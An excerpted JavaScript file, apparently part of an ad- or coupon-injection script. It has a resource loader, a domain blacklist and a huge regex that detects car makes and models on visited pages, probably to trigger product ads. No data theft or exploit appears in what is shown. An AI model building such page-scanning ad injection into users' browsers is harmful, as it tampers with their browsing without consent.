    (function(){
        ...
        var i = b(a),
        j = i.autoCallback;
        i.url.split(".").pop().split("?").shift(), i.bypass || (e && (e = d(e) ? e : e[a] || e[g] ||
        e[a.split("/").pop().split("?")[0]]), i.instead ? i.instead(a, e, f, g, h) : (y[i.url] ? i.noexec = !0 :
        y[i.url] = 1, f.load(i.url, i.forceCSS || !i.forceJS && "css" == i.url.split(".").pop().split("?").shift() ? "c"
        ...
        jq:null,
        load:function(a){
        // window.console.log("load1 " + (this.jq ? this.jq.fn.jquery : this.jq) + " orig: " +
        this.originalJq.fn.jquery);
        var b = this;
        ...
        var CPNblacklist =
        ";continuations.com;blogspot.co.uk;stackoverflow.com;delta-search.com;pandora.com;go.com;facebook.com;mycouponbuddy.com;yahoo.com;cashnetusa.com;hulu.com;google.com;ebay.com;publicstorage.com;youtube.com;travelocity.com;";
        ...
        && document.location.hostname.indexOf('olx.com.br') === -1 )
        {
        ...
        function isCarPIP()
        {
        var termsRegex = /\b(acura(.+)?cl|acura(.+)?ilx|acura(.+)?ilx
        hybrid|acura(.+)?integra|acura(.+)?legend|acura(.+)?mdx|acura(.+)?nsx|acura(.+)?rdx|acura(.+)?rl|acura(.+)?rlx|acura(.+)?rsx|acura(.+)?slx|acura(.+)?tl|acura(.+)?tsx|acura(.+)?tsx
        sport wagon|acura(.+)?vigor|acura(.+)?zdx|alfa romeo(.+)?164|alfa romeo(.+)?8c competizione|alfa
        romeo(.+)?graduate|alfa romeo(.+)?gtv|alfa romeo(.+)?gtv-6|alfa romeo(.+)?milano|alfa
        romeo(.+)?quadrifoglio|alfa romeo(.+)?spider|am general(.+)?hummer|amc(.+)?concord|amc(.+)?eagle 30|american
        motors(.+)?alliance|american motors(.+)?concord|american motors(.+)?eagle|american motors(.+)?eagle 30|american
        motors(.+)?eagle 50|american motors(.+)?encore|american motors(.+)?spirit|aston martin(.+)?db ar1 zagato|aston
        martin(.+)?db7|aston martin(.+)?db7 vantage|aston martin(.+)?db9|aston martin(.+)?dbs|aston
        martin(.+)?lagonda|aston martin(.+)?rapide|aston martin(.+)?rapide s|aston martin(.+)?v12 vanquish|aston
        martin(.+)?v12 vantage|aston martin(.+)?v8 vantage|aston martin(.+)?v8 vantage s|aston martin(.+)?vanquish|aston
        martin(.+)?vantage|aston martin(.+)?virage|aston martin(.+)?volante|aston
        martin(.+)?zagato|audi(.+)?80|audi(.+)?90|audi(.+)?100|audi(.+)?200|audi(.+)?4000|audi(.+)?5000|audi(.+)?a3|audi(.+)?a4|audi(.+)?a5|audi(.+)?a6|audi(.+)?a7|audi(.+)?a8|audi(.+)?allroad|audi(.+)?allroad
        quattro|audi(.+)?cabriolet|audi(.+)?gt|audi(.+)?q5|audi(.+)?q5
        hybrid|audi(.+)?q7|audi(.+)?quattro|audi(.+)?r8|audi(.+)?r9|audi(.+)?rs 4|audi(.+)?rs 5|audi(.+)?rs
        6|audi(.+)?rs
        7|audi(.+)?rs4|audi(.+)?rs6|audi(.+)?rs7|audi(.+)?s4|audi(.+)?s5|audi(.+)?s6|audi(.+)?s7|audi(.+)?s8|audi(.+)?sq5|audi(.+)?tt|audi(.+)?tt
        rs|audi(.+)?tts|avanti motors(.+)?avanti|avanti motors(.+)?avanti
        ii|bentley(.+)?arnage|bentley(.+)?azure|bentley(.+)?brooklands|bentley(.+)?continental|bentley(.+)?continental
        flying spur|bentley(.+)?continental flying spur speed|bentley(.+)?continental gt|bentley(.+)?continental gt
        speed|bentley(.+)?continental gt v8|bentley(.+)?continental gt v8 s|bentley(.+)?continental
        gtc|bentley(.+)?continental gtc speed|bentley(.+)?continental gtc v8|bentley(.+)?continental
        supersports|bentley(.+)?corniche|bentley(.+)?eight|bentley(.+)?flying
        spur|bentley(.+)?mulsanne|bentley(.+)?mulsanne s|bentley(.+)?mulsanne turbo|bentley(.+)?r-type|bentley(.+)?turbo
        r|bentley(.+)?turbo rl|bentley(.+)?turbo rt|bentley(.+)?turbo
        s|bmw(.+)?128|bmw(.+)?135|bmw(.+)?318|bmw(.+)?320|bmw(.+)?323|bmw(.+)?325|bmw(.+)?328|bmw(.+)?330|bmw(.+)?335|bmw(.+)?428|bmw(.+)?435|bmw(.+)?524|bmw(.+)?525|bmw(.+)?528|bmw(.+)?530|bmw(.+)?533|bmw(.+)?535|bmw(.+)?540|bmw(.+)?545|bmw(.+)?550|bmw(.+)?633|bmw(.+)?635|bmw(.+)?640|bmw(.+)?645|bmw(.+)?650|bmw(.+)?733|bmw(.+)?735|bmw(.+)?740|bmw(.+)?745|bmw(.+)?750|bmw(.+)?760|bmw(.+)?840|bmw(.+)?850|bmw(.+)?1
        series|bmw(.+)?1 series m|bmw(.+)?2 series|bmw(.+)?3 series|bmw(.+)?328 gran turismo|bmw(.+)?328d|bmw(.+)?335
        gran turismo|bmw(.+)?4 series|bmw(.+)?5 series|bmw(.+)?535 gran turismo|bmw(.+)?535d|bmw(.+)?550 gran
        turismo|bmw(.+)?6 series|bmw(.+)?640 gran coupe|bmw(.+)?650 gran coupe|bmw(.+)?7 series|bmw(.+)?activehybrid
        3|bmw(.+)?activehybrid 5|bmw(.+)?activehybrid 7|bmw(.+)?activehybrid 740|bmw(.+)?activehybrid
        750|bmw(.+)?activehybrid x6|bmw(.+)?alpina
        b7|bmw(.+)?i3|bmw(.+)?i8|bmw(.+)?l6|bmw(.+)?l7|bmw(.+)?m|bmw(.+)?m3|bmw(.+)?m4|bmw(.+)?m5|bmw(.+)?m6|bmw(.+)?m6
        gran coupe|bmw(.+)?x1|bmw(.+)?x3|bmw(.+)?x5|bmw(.+)?x5 m|bmw(.+)?x6|bmw(.+)?x6
        m|bmw(.+)?z3|bmw(.+)?z4|bmw(.+)?z4 m|bmw(.+)?z8|bugatti(.+)?veyron|bugatti(.+)?veyron
        16.4|buick(.+)?century|buick(.+)?electra|buick(.+)?enclave|buick(.+)?encore|buick(.+)?estate
        wagon|buick(.+)?lacrosse|buick(.+)?lesabre|buick(.+)?lucerne|buick(.+)?park
        avenue|buick(.+)?rainier|buick(.+)?reatta|buick(.+)?regal|buick(.+)?rendezvous|buick(.+)?riviera|buick(.+)?roadmaster|buick(.+)?skyhawk|buick(.+)?skylark|buick(.+)?somerset|buick(.+)?terraza|buick(.+)?verano|cadillac(.+)?allante|cadillac(.+)?ats|cadillac(.+)?brougham|cadillac(.+)?catera|cadillac(.+)?cimarron|cadillac(.+)?cts|cadillac(.+)?cts-v|cadillac(.+)?deville|cadillac(.+)?dts|cadillac(.+)?dts
        pro|cadillac(.+)?eldorado|cadillac(.+)?elr|cadillac(.+)?escalade|cadillac(.+)?escalade esv|cadillac(.+)?escalade
        ext|cadillac(.+)?escalade hybrid|cadillac(.+)?fleetwood|cadillac(.+)?fleetwood brougham|cadillac(.+)?fleetwood
        limo|cadillac(.+)?seville|cadillac(.+)?sixty
        special|cadillac(.+)?srx|cadillac(.+)?sts|cadillac(.+)?xlr|cadillac(.+)?xlr-v|cadillac(.+)?xts|cadillac(.+)?xts
        pro|checker(.+)?marathon|chevrolet(.+)?1500|chevrolet(.+)?2500|chevrolet(.+)?3500|chevrolet(.+)?astro|chevrolet(.+)?astro
        cargo|chevrolet(.+)?avalanche|chevrolet(.+)?aveo|chevrolet(.+)?beretta|chevrolet(.+)?black diamond
        avalanche|chevrolet(.+)?blazer|chevrolet(.+)?c\/k 10 series|chevrolet(.+)?c\/k 1500 series|chevrolet(.+)?c\/k
        2500 series|chevrolet(.+)?c\/k 3500
        series|chevrolet(.+)?c10\/k10|chevrolet(.+)?c20\/k20|chevrolet(.+)?c30\/k30|chevrolet(.+)?camaro|chevrolet(.+)?caprice|chevrolet(.+)?caprice
        classic|chevrolet(.+)?captiva
        sport|chevrolet(.+)?cavalier|chevrolet(.+)?celebrity|chevrolet(.+)?chevette|chevrolet(.+)?chevy
        van|chevrolet(.+)?citation|chevrolet(.+)?classic|chevrolet(.+)?cobalt|chevrolet(.+)?colorado|chevrolet(.+)?corsica|chevrolet(.+)?corvette|chevrolet(.+)?corvette
        stingray|chevrolet(.+)?cruze|chevrolet(.+)?el
        camino|chevrolet(.+)?equinox|chevrolet(.+)?express|chevrolet(.+)?express 1500|chevrolet(.+)?express
        2500|chevrolet(.+)?express 3500|chevrolet(.+)?express cargo|chevrolet(.+)?express
        cutaway|chevrolet(.+)?hhr|chevrolet(.+)?impala|chevrolet(.+)?impala
        limited|chevrolet(.+)?lumina|chevrolet(.+)?lumina apv|chevrolet(.+)?lumina
        minivan|chevrolet(.+)?luv|chevrolet(.+)?malibu|chevrolet(.+)?malibu classic|chevrolet(.+)?malibu
        hybrid|chevrolet(.+)?malibu maxx|chevrolet(.+)?metro|chevrolet(.+)?monte
        carlo|chevrolet(.+)?nova|chevrolet(.+)?pickup|chevrolet(.+)?prizm|chevrolet(.+)?s-10|chevrolet(.+)?s-10
        blazer|chevrolet(.+)?silverado 1500|chevrolet(.+)?silverado 1500 classic|chevrolet(.+)?silverado 1500
        hybrid|chevrolet(.+)?silverado 1500 ss|chevrolet(.+)?silverado 1500 ss classic|chevrolet(.+)?silverado
        1500hd|chevrolet(.+)?silverado 1500hd classic|chevrolet(.+)?silverado 2500|chevrolet(.+)?silverado
        2500hd|chevrolet(.+)?silverado 2500hd classic|chevrolet(.+)?silverado 3500|chevrolet(.+)?silverado 3500
        classic|chevrolet(.+)?silverado 3500hd|chevrolet(.+)?silverado 3500hd
        cc|chevrolet(.+)?sonic|chevrolet(.+)?spark|chevrolet(.+)?spark
        ev|chevrolet(.+)?spectrum|chevrolet(.+)?sportvan|chevrolet(.+)?sprint|chevrolet(.+)?ss|chevrolet(.+)?ssr|chevrolet(.+)?suburban|chevrolet(.+)?tahoe|chevrolet(.+)?tahoe
        hybrid|chevrolet(.+)?tahoe
        limited\/z71|chevrolet(.+)?tracker|chevrolet(.+)?trailblazer|chevrolet(.+)?trailblazer
        ext|chevrolet(.+)?traverse|chevrolet(.+)?uplander|chevrolet(.+)?v20|chevrolet(.+)?v30|chevrolet(.+)?van|chevrolet(.+)?venture|chevrolet(.+)?volt|chrysler(.+)?200|chrysler(.+)?300|chrysler(.+)?200
        convertible|chrysler(.+)?300c|chrysler(.+)?300c srt-8|chrysler(.+)?300m|chrysler(.+)?aspen|chrysler(.+)?aspen
        hybrid|chrysler(.+)?cirrus|chrysler(.+)?concorde|chrysler(.+)?conquest|chrysler(.+)?cordoba|chrysler(.+)?crossfire|chrysler(.+)?crossfire
        srt-6|chrysler(.+)?e class|chrysler(.+)?executive|chrysler(.+)?fifth avenue|chrysler(.+)?grand
        voyager|chrysler(.+)?imperial|chrysler(.+)?laser|chrysler(.+)?le
        baron|chrysler(.+)?lebaron|chrysler(.+)?lhs|chrysler(.+)?new
        yorker|chrysler(.+)?pacifica|chrysler(.+)?prowler|chrysler(.+)?pt cruiser|chrysler(.+)?sebring|chrysler(.+)?tc
        by maserati|chrysler(.+)?town & country|chrysler(.+)?town and
        country|chrysler(.+)?voyager|daewoo(.+)?lanos|daewoo(.+)?leganza|daewoo(.+)?nubira|daihatsu(.+)?charade|daihatsu(.+)?rocky|delorean(.+)?dmc-12|detomaso(.+)?pantera|dodge(.+)?400|dodge(.+)?600|dodge(.+)?aries|dodge(.+)?avenger|dodge(.+)?caliber|dodge(.+)?caravan|dodge(.+)?challenger|dodge(.+)?charger|dodge(.+)?charger
        srt-8|dodge(.+)?colt|dodge(.+)?conquest|dodge(.+)?d100|dodge(.+)?d150|dodge(.+)?d250|dodge(.+)?d350|dodge(.+)?dakota|dodge(.+)?dart|dodge(.+)?daytona|dodge(.+)?diplomat|dodge(.+)?durango|dodge(.+)?durango
        hybrid|dodge(.+)?dynasty|dodge(.+)?grand
        caravan|dodge(.+)?intrepid|dodge(.+)?journey|dodge(.+)?lancer|dodge(.+)?magnum|dodge(.+)?magnum
        srt-8|dodge(.+)?mini ram|dodge(.+)?mirada|dodge(.+)?monaco|dodge(.+)?neon|dodge(.+)?neon
        srt-4|dodge(.+)?nitro|dodge(.+)?omni|dodge(.+)?pickup|dodge(.+)?raider|dodge(.+)?ram 100|dodge(.+)?ram
        150|dodge(.+)?ram 1500|dodge(.+)?ram 250|dodge(.+)?ram 2500|dodge(.+)?ram 350|dodge(.+)?ram 3500|dodge(.+)?ram
        50|dodge(.+)?ram 50 pickup|dodge(.+)?ram cargo|dodge(.+)?ram chassis 3500|dodge(.+)?ram chassis
        4500|dodge(.+)?ram pickup 1500|dodge(.+)?ram pickup 1500 srt-10|dodge(.+)?ram pickup 2500|dodge(.+)?ram pickup
        3500|dodge(.+)?ram van|dodge(.+)?ram
        wagon|dodge(.+)?ramcharger|dodge(.+)?rampage|dodge(.+)?shadow|dodge(.+)?spirit|dodge(.+)?sprinter|dodge(.+)?sprinter
        cargo|dodge(.+)?srt
        viper|dodge(.+)?stealth|dodge(.+)?stratus|dodge(.+)?van|dodge(.+)?viper|dodge(.+)?w100|dodge(.+)?w150|dodge(.+)?w250|dodge(.+)?w350|eagle(.+)?medallion|eagle(.+)?premier|eagle(.+)?summit|eagle(.+)?talon|eagle(.+)?vision|ferrari(.+)?308|ferrari(.+)?328|ferrari(.+)?348|ferrari(.+)?360|ferrari(.+)?512|ferrari(.+)?599|ferrari(.+)?360
        modena|ferrari(.+)?360 spider|ferrari(.+)?400i|ferrari(.+)?456 gt|ferrari(.+)?456 m|ferrari(.+)?458
        italia|ferrari(.+)?458 spider|ferrari(.+)?512 m|ferrari(.+)?512 tr|ferrari(.+)?550 barchetta|ferrari(.+)?550
        maranello|ferrari(.+)?575 m|ferrari(.+)?575m|ferrari(.+)?599 gtb fiorano|ferrari(.+)?599 gto|ferrari(.+)?612
        scaglietti|ferrari(.+)?california|ferrari(.+)?challenge
        stradale|ferrari(.+)?enzo|ferrari(.+)?f12berlinetta|ferrari(.+)?f355|ferrari(.+)?f40|ferrari(.+)?f430|ferrari(.+)?f430
        spider|ferrari(.+)?f50|ferrari(.+)?ff|ferrari(.+)?gtb|ferrari(.+)?gto|ferrari(.+)?gts|ferrari(.+)?mondial|ferrari(.+)?mondial
        t|ferrari(.+)?superamerica|ferrari(.+)?testarossa|fiat(.+)?500|fiat(.+)?500c|fiat(.+)?500e|fiat(.+)?500l|fiat(.+)?500t|fiat(.+)?pininfarina|fiat(.+)?spider
        2000|fiat(.+)?x1\/9|fisker(.+)?karma|ford(.+)?aerostar|ford(.+)?aspire|ford(.+)?bronco|ford(.+)?bronco
        ii|ford(.+)?c-max energi|ford(.+)?c-max hybrid|ford(.+)?club wagon|ford(.+)?contour|ford(.+)?crown
        victoria|ford(.+)?e-150|ford(.+)?e-250|ford(.+)?e-350|ford(.+)?e-series cargo|ford(.+)?e-series
        chassis|ford(.+)?e-series wagon|ford(.+)?e100|ford(.+)?e150|ford(.+)?e250|ford(.+)?e350|ford(.+)?e350 super
        duty|ford(.+)?econoline cargo|ford(.+)?econoline wagon|ford(.+)?edge|ford(.+)?escape|ford(.+)?escape
        hybrid|ford(.+)?escort|ford(.+)?excursion|ford(.+)?exp|ford(.+)?expedition|ford(.+)?expedition
        el|ford(.+)?explorer|ford(.+)?explorer sport|ford(.+)?explorer sport trac|ford(.+)?f-150|ford(.+)?f-150
        heritage|ford(.+)?f-150 svt lightning|ford(.+)?f-250|ford(.+)?f-250 super duty|ford(.+)?f-350|ford(.+)?f-350
        super duty|ford(.+)?f-450 super duty|ford(.+)?f-550 super
        duty|ford(.+)?f100|ford(.+)?f150|ford(.+)?f250|ford(.+)?f350|ford(.+)?f450|ford(.+)?fairmont|ford(.+)?fairmont
        futura|ford(.+)?festiva|ford(.+)?fiesta|ford(.+)?five hundred|ford(.+)?flex|ford(.+)?focus|ford(.+)?focus
        electric|ford(.+)?focus st|ford(.+)?focus
        svt|ford(.+)?freestar|ford(.+)?freestyle|ford(.+)?fusion|ford(.+)?fusion energi|ford(.+)?fusion
        hybrid|ford(.+)?gt|ford(.+)?ltd|ford(.+)?ltd crown victoria|ford(.+)?mustang|ford(.+)?mustang svt
        cobra|ford(.+)?pickup|ford(.+)?probe|ford(.+)?ranger|ford(.+)?shelby gt500|ford(.+)?taurus|ford(.+)?taurus
        x|ford(.+)?tempo|ford(.+)?thunderbird|ford(.+)?transit cargo|ford(.+)?transit connect|ford(.+)?transit connect
        cargo|ford(.+)?transit connect wagon|ford(.+)?van|ford(.+)?windstar|ford(.+)?windstar
        cargo|ford(.+)?zx2|geo(.+)?metro|geo(.+)?prizm|geo(.+)?spectrum|geo(.+)?storm|geo(.+)?tracker|gmc(.+)?1500|gmc(.+)?2500|gmc(.+)?3500|gmc(.+)?acadia|gmc(.+)?c\/k
        1500 series|gmc(.+)?c\/k 2500 series|gmc(.+)?c\/k 3500
        series|gmc(.+)?caballero|gmc(.+)?canyon|gmc(.+)?envoy|gmc(.+)?envoy xl|gmc(.+)?envoy
        xuv|gmc(.+)?jimmy|gmc(.+)?pickup|gmc(.+)?rally|gmc(.+)?rally wagon|gmc(.+)?s-15 jimmy|gmc(.+)?s-15
        pickup|gmc(.+)?safari|gmc(.+)?safari cargo|gmc(.+)?savana|gmc(.+)?savana 1500|gmc(.+)?savana 2500|gmc(.+)?savana
        3500|gmc(.+)?savana cargo|gmc(.+)?savana cutaway|gmc(.+)?savana passenger|gmc(.+)?sierra 1500|gmc(.+)?sierra
        1500 classic|gmc(.+)?sierra 1500 hybrid|gmc(.+)?sierra 1500hd|gmc(.+)?sierra 1500hd classic|gmc(.+)?sierra
        2500|gmc(.+)?sierra 2500hd|gmc(.+)?sierra 2500hd classic|gmc(.+)?sierra 3500|gmc(.+)?sierra 3500
        classic|gmc(.+)?sierra 3500hd|gmc(.+)?sierra 3500hd cc|gmc(.+)?sierra c3|gmc(.+)?sierra classic
        1500|gmc(.+)?sierra classic
        2500|gmc(.+)?sonoma|gmc(.+)?suburban|gmc(.+)?syclone|gmc(.+)?terrain|gmc(.+)?van|gmc(.+)?vandura|gmc(.+)?yukon|gmc(.+)?yukon
        denali|gmc(.+)?yukon hybrid|gmc(.+)?yukon xl|honda(.+)?accord|honda(.+)?accord crosstour|honda(.+)?accord
        hybrid|honda(.+)?accord plug-in|honda(.+)?accord plug-in hybrid|honda(.+)?civic|honda(.+)?civic del
        sol|honda(.+)?civic hybrid|honda(.+)?cr-v|honda(.+)?cr-z|honda(.+)?crosstour|honda(.+)?crx|honda(.+)?del
        sol|honda(.+)?element|honda(.+)?fit|honda(.+)?fit
        ev|honda(.+)?insight|honda(.+)?odyssey|honda(.+)?passport|honda(.+)?pilot|honda(.+)?prelude|honda(.+)?ridgeline|honda(.+)?s2000|hummer(.+)?h1|hummer(.+)?h1
        alpha|hummer(.+)?h2|hummer(.+)?h2
        sut|hummer(.+)?h3|hummer(.+)?h3t|hyundai(.+)?accent|hyundai(.+)?azera|hyundai(.+)?elantra|hyundai(.+)?elantra
        coupe|hyundai(.+)?elantra gt|hyundai(.+)?elantra
        touring|hyundai(.+)?entourage|hyundai(.+)?equus|hyundai(.+)?excel|hyundai(.+)?genesis|hyundai(.+)?genesis
        coupe|hyundai(.+)?santa fe|hyundai(.+)?santa fe sport|hyundai(.+)?scoupe|hyundai(.+)?sonata|hyundai(.+)?sonata
        hybrid|hyundai(.+)?tiburon|hyundai(.+)?tucson|hyundai(.+)?veloster|hyundai(.+)?veloster
        turbo|hyundai(.+)?veracruz|hyundai(.+)?xg300|hyundai(.+)?xg350|infiniti(.+)?ex35|infiniti(.+)?ex37|infiniti(.+)?fx35|infiniti(.+)?fx37|infiniti(.+)?fx45|infiniti(.+)?fx50|infiniti(.+)?g20|infiniti(.+)?g25|infiniti(.+)?g25
        sedan|infiniti(.+)?g35|infiniti(.+)?g37|infiniti(.+)?g37 convertible|infiniti(.+)?g37 coupe|infiniti(.+)?g37
        sedan|infiniti(.+)?i30|infiniti(.+)?i35|infiniti(.+)?ipl g|infiniti(.+)?ipl g convertible|infiniti(.+)?ipl g
        coupe|infiniti(.+)?j30|infiniti(.+)?jx35|infiniti(.+)?m30|infiniti(.+)?m35|infiniti(.+)?m35h|infiniti(.+)?m37|infiniti(.+)?m45|infiniti(.+)?m56|infiniti(.+)?q45|infiniti(.+)?q50|infiniti(.+)?q50
        hybrid|infiniti(.+)?q60|infiniti(.+)?q60 convertible|infiniti(.+)?q60 coupe|infiniti(.+)?q60
        ipl|infiniti(.+)?q60 ipl convertible|infiniti(.+)?q60 ipl
        coupe|infiniti(.+)?q70|infiniti(.+)?qx4|infiniti(.+)?qx50|infiniti(.+)?qx56|infiniti(.+)?qx60|infiniti(.+)?qx60
        hybrid|infiniti(.+)?qx70|infiniti(.+)?qx80|international(.+)?cxt|international(.+)?mxt|international(.+)?rxt|isuzu(.+)?amigo|isuzu(.+)?ascender|isuzu(.+)?axiom|isuzu(.+)?hombre|isuzu(.+)?i-280|isuzu(.+)?i-290|isuzu(.+)?i-350|isuzu(.+)?i-370|isuzu(.+)?i-mark|isuzu(.+)?i-series|isuzu(.+)?impulse|isuzu(.+)?oasis|isuzu(.+)?pickup|isuzu(.+)?rodeo|isuzu(.+)?rodeo
        sport|isuzu(.+)?stylus|isuzu(.+)?trooper|isuzu(.+)?vehicross|jaguar(.+)?f-type|jaguar(.+)?s-type|jaguar(.+)?s-type
        r|jaguar(.+)?super v8|jaguar(.+)?super v8 portfolio|jaguar(.+)?vanden
        plas|jaguar(.+)?x-type|jaguar(.+)?xf|jaguar(.+)?xj|jaguar(.+)?xj-series|jaguar(.+)?xj12|jaguar(.+)?xj6|jaguar(.+)?xj8|jaguar(.+)?xjl|jaguar(.+)?xjr|jaguar(.+)?xjr-s|jaguar(.+)?xjs|jaguar(.+)?xk|jaguar(.+)?xk-series|jaguar(.+)?xk8|jaguar(.+)?xkr|jeep(.+)?cherokee|jeep(.+)?cj|jeep(.+)?cj-5|jeep(.+)?cj-7|jeep(.+)?comanche|jeep(.+)?commander|jeep(.+)?compass|jeep(.+)?grand
        cherokee|jeep(.+)?grand cherokee srt-8|jeep(.+)?grand
        wagoneer|jeep(.+)?j10|jeep(.+)?j20|jeep(.+)?liberty|jeep(.+)?patriot|jeep(.+)?scrambler|jeep(.+)?wagoneer|jeep(.+)?wrangler|jeep(.+)?wrangler
        unlimited|kia(.+)?amanti|kia(.+)?borrego|kia(.+)?cadenza|kia(.+)?forte|kia(.+)?forte 5-door|kia(.+)?forte
        koup|kia(.+)?k900|kia(.+)?optima|kia(.+)?optima
        hybrid|kia(.+)?rio|kia(.+)?rio5|kia(.+)?rondo|kia(.+)?sedona|kia(.+)?sephia|kia(.+)?sorento|kia(.+)?soul|kia(.+)?spectra|kia(.+)?spectra5|kia(.+)?sportage|koenigsegg(.+)?ccx|lamborghini(.+)?aventador|lamborghini(.+)?countach|lamborghini(.+)?diablo|lamborghini(.+)?gallardo|lamborghini(.+)?jalpa|lamborghini(.+)?lm002|lamborghini(.+)?murcielago|land
        rover(.+)?defender|land rover(.+)?discovery|land rover(.+)?discovery series ii|land rover(.+)?freelander|land
        rover(.+)?lr2|land rover(.+)?lr3|land rover(.+)?lr4|land rover(.+)?range rover|land rover(.+)?range rover
        evoque|land rover(.+)?range rover evoque coupe|land rover(.+)?range rover sport|land rover(.+)?series
        iii|lexus(.+)?ct 200h|lexus(.+)?es 250|lexus(.+)?es 300|lexus(.+)?es 300h|lexus(.+)?es 330|lexus(.+)?es
        350|lexus(.+)?gs 300|lexus(.+)?gs 350|lexus(.+)?gs 400|lexus(.+)?gs 430|lexus(.+)?gs 450h|lexus(.+)?gs
        460|lexus(.+)?gx 460|lexus(.+)?gx 470|lexus(.+)?hs 250h|lexus(.+)?is 250|lexus(.+)?is 250c|lexus(.+)?is
        300|lexus(.+)?is 350|lexus(.+)?is 350c|lexus(.+)?is f|lexus(.+)?is-f|lexus(.+)?lfa|lexus(.+)?ls 400|lexus(.+)?ls
        430|lexus(.+)?ls 460|lexus(.+)?ls 600h l|lexus(.+)?lx 450|lexus(.+)?lx 470|lexus(.+)?lx 570|lexus(.+)?rx
        300|lexus(.+)?rx 330|lexus(.+)?rx 350|lexus(.+)?rx 400h|lexus(.+)?rx 450h|lexus(.+)?sc 300|lexus(.+)?sc
        400|lexus(.+)?sc
        430|lincoln(.+)?aviator|lincoln(.+)?blackwood|lincoln(.+)?continental|lincoln(.+)?ls|lincoln(.+)?mark
        lt|lincoln(.+)?mark vi|lincoln(.+)?mark vii|lincoln(.+)?mark
        viii|lincoln(.+)?mkc|lincoln(.+)?mks|lincoln(.+)?mkt|lincoln(.+)?mkt town
        car|lincoln(.+)?mkx|lincoln(.+)?mkz|lincoln(.+)?mkz hybrid|lincoln(.+)?navigator|lincoln(.+)?navigator
        l|lincoln(.+)?town car|lincoln(.+)?zephyr|lotus(.+)?elan|lotus(.+)?elise|lotus(.+)?esprit|lotus(.+)?esprit
        v8|lotus(.+)?evora|lotus(.+)?exige|lotus(.+)?exige
        s|makename(.+)?modelname|maserati(.+)?228|maserati(.+)?430|maserati(.+)?biturbo|maserati(.+)?coupe|maserati(.+)?ghibli|maserati(.+)?gransport|maserati(.+)?gransport
        spyder|maserati(.+)?granturismo|maserati(.+)?quattroporte|maserati(.+)?spyder|maybach(.+)?57|maybach(.+)?landaulet|maybach(.+)?type
        57|maybach(.+)?type 62|mazda(.+)?323|mazda(.+)?626|mazda(.+)?929|mazda(.+)?b-series pickup|mazda(.+)?b-series
        truck|mazda(.+)?b2000|mazda(.+)?b2200|mazda(.+)?b2300|mazda(.+)?b2500|mazda(.+)?b2600|mazda(.+)?b3000|mazda(.+)?b4000|mazda(.+)?cx-5|mazda(.+)?cx-7|mazda(.+)?cx-9|mazda(.+)?glc|mazda(.+)?mazda2|mazda(.+)?mazda3|mazda(.+)?mazda5|mazda(.+)?mazda6|mazda(.+)?mazdaspeed
        miata mx-5|mazda(.+)?mazdaspeed mx-5|mazda(.+)?mazdaspeed
        protege|mazda(.+)?mazdaspeed3|mazda(.+)?mazdaspeed6|mazda(.+)?miata
        mx-5|mazda(.+)?millenia|mazda(.+)?mpv|mazda(.+)?mx-3|mazda(.+)?mx-5
        miata|mazda(.+)?mx-6|mazda(.+)?navajo|mazda(.+)?pickup|mazda(.+)?protege|mazda(.+)?protege5|mazda(.+)?rx-7|mazda(.+)?rx-8|mazda(.+)?tribute|mazda(.+)?tribute
        hybrid|mazda(.+)?truck|mclaren(.+)?mp4-12c|mclaren(.+)?mp4-12c
        spider|mercedes-benz(.+)?190|mercedes-benz(.+)?240d|mercedes-benz(.+)?300-class|mercedes-benz(.+)?380-class|mercedes-benz(.+)?400-class|mercedes-benz(.+)?420-class|mercedes-benz(.+)?500-class|mercedes-benz(.+)?560-class|mercedes-benz(.+)?c-class|mercedes-benz(.+)?cl-class|mercedes-benz(.+)?cla-class|mercedes-benz(.+)?clk-class|mercedes-benz(.+)?cls-class|mercedes-benz(.+)?e-class|mercedes-benz(.+)?g-class|mercedes-benz(.+)?gl-class|mercedes-benz(.+)?glk-class|mercedes-benz(.+)?m-class|mercedes-benz(.+)?r-class|mercedes-benz(.+)?s-class|mercedes-benz(.+)?sl-class|mercedes-benz(.+)?slk-class|mercedes-benz(.+)?slr
        mclaren|mercedes-benz(.+)?slr-class|mercedes-benz(.+)?sls amg|mercedes-benz(.+)?sls amg black
        series|mercedes-benz(.+)?sls-class|mercedes-benz(.+)?sprinter|mercedes-benz(.+)?sprinter
        cargo|mercury(.+)?capri|mercury(.+)?colony park|mercury(.+)?cougar|mercury(.+)?grand
        marquis|mercury(.+)?ln7|mercury(.+)?lynx|mercury(.+)?marauder|mercury(.+)?mariner|mercury(.+)?mariner
        hybrid|mercury(.+)?marquis|mercury(.+)?milan|mercury(.+)?milan
        hybrid|mercury(.+)?montego|mercury(.+)?monterey|mercury(.+)?mountaineer|mercury(.+)?mystique|mercury(.+)?sable|mercury(.+)?topaz|mercury(.+)?tracer|mercury(.+)?villager|mercury(.+)?zephyr|merkur(.+)?scorpio|merkur(.+)?xr4ti|mini(.+)?clubman|mini(.+)?convertible|mini(.+)?cooper|mini(.+)?cooper
        clubman|mini(.+)?cooper convertible|mini(.+)?cooper countryman|mini(.+)?cooper coupe|mini(.+)?cooper
        hardtop|mini(.+)?cooper paceman|mini(.+)?cooper roadster|mini(.+)?cooper s|mini(.+)?cooper s
        clubman|mini(.+)?cooper s
        countryman|mini(.+)?countryman|mini(.+)?coupe|mini(.+)?hardtop|mini(.+)?paceman|mini(.+)?roadster|mitsubishi(.+)?3000gt|mitsubishi(.+)?cordia|mitsubishi(.+)?diamante|mitsubishi(.+)?eclipse|mitsubishi(.+)?eclipse
        spyder|mitsubishi(.+)?endeavor|mitsubishi(.+)?expo|mitsubishi(.+)?galant|mitsubishi(.+)?i-miev|mitsubishi(.+)?lancer|mitsubishi(.+)?lancer
        evolution|mitsubishi(.+)?lancer
        sportback|mitsubishi(.+)?minivan|mitsubishi(.+)?mirage|mitsubishi(.+)?montero|mitsubishi(.+)?montero
        sport|mitsubishi(.+)?outlander|mitsubishi(.+)?outlander
        sport|mitsubishi(.+)?pickup|mitsubishi(.+)?precis|mitsubishi(.+)?raider|mitsubishi(.+)?sigma|mitsubishi(.+)?starion|mitsubishi(.+)?tredia|morgan(.+)?aero
        8|morgan(.+)?plus
        8|morgan(.+)?roadster|nissan(.+)?200sx|nissan(.+)?240sx|nissan(.+)?280zx|nissan(.+)?300zx|nissan(.+)?350z|nissan(.+)?370z|nissan(.+)?altima|nissan(.+)?altima
        hybrid|nissan(.+)?armada|nissan(.+)?axxess|nissan(.+)?cube|nissan(.+)?frontier|nissan(.+)?gt-r|nissan(.+)?juke|nissan(.+)?leaf|nissan(.+)?maxima|nissan(.+)?murano|nissan(.+)?murano
